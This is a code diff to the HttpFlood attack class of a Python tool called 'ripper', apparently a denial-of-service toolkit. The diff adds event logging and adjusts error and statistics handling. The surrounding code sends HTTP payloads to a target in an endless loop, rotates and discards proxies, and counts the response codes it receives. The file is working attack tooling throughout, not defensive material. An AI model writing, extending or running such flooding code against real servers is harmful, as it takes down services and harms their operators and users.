@@ -7,12 +7,15 @@ from socks import ProxyError
 
 from ripper.constants import HTTP_STATUS_CODE_CHECK_PERIOD_SEC
 from ripper.context.errors import Errors
+from ripper.context.events_journal import EventsJournal
 from ripper.context.target import Target
 from ripper.actions.attack_method import AttackMethod
 
 HTTP_STATUS_PATTERN = re.compile(r" (\d{3}) ")
 # Forward Reference
 Context = 'Context'
+
+Events = EventsJournal()
 
 
 class HttpFlood(AttackMethod):
@@ -40,10 +43,12 @@ class HttpFlood(AttackMethod):
         with suppress(Exception), self.create_connection() as self._http_connect:
             self._http_connect.connect(self._target.hostip_port_tuple())
             self._ctx.target.statistic.connect.status_success()
+            Events.info('Creating HTTP connection...')
             while self.send(self._http_connect):
                 if self._ctx.dry_run:
                     break
                 continue
+            self._ctx.target.statistic.connect.status_failed()
 
     def check_response_status(self, payload: bytes):
         with suppress(Exception):
@@ -55,6 +60,7 @@ class HttpFlood(AttackMethod):
                 check_sock.close()
                 status = int(re.search(HTTP_STATUS_PATTERN, http_response)[1])
                 self._ctx.target.statistic.http_stats[status] += 1
+                Events.info('Checked Response status... SUCCESS')
 
     def send(self, sock: socket) -> bool:
         payload = self.payload().encode('utf-8')
@@ -64,8 +70,7 @@ class HttpFlood(AttackMethod):
         except ProxyError:
             self._ctx.proxy_manager.delete_proxy_sync(self._proxy)
         except Exception as e:
-            self._ctx.add_error(Errors(type(e).__name__, e.__str__()[:128]))
-            self._ctx.target.statistic.connect.status_failed()
+            Events.exception(e)
         else:
             self._ctx.target.statistic.packets.status_sent(sent)
             self._proxy.report_success() if self._proxy is not None else 0
